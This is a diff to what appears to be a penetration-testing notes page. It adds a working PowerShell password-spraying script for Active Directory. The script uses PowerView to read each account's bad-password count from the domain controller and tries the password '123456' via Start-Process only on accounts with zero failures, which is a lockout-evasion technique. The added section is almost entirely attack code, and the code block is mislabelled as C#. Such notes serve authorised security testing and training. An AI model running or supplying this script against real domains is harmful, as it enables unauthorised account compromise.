@@ -63,9 +63,39 @@ $password = "123456"
 
 Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:
 
-{% hint style="info" %}
-WIP
-{% endhint %}
+{% code-tabs %}
+{% code-tabs-item title="spray-ldap.ps1" %}
+```csharp
+# will spray only users that currently have 0 bad password attempts
+# dependcy - powerview
+
+$users = (Get-Content $userlist)
+$domain = "domaintospray.tld"
+
+Write-Host $users.Count users supplied; $users | % {
+    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
+    if ($badPasswordCount -eq 0) {
+        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
+        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String "123456" -AsPlainText -Force))
+        Start-Process cmd -Credential ($credentials)
+    } else {
+        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
+    }
+}
+ 
+function Get-BadPasswordCount {
+    param(
+        $username = "username",
+        $domain = "domaintospray.tld"
+    )
+    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
+    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc).badpwdcount
+
+    return $badPwdCount
+}
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ## References
 
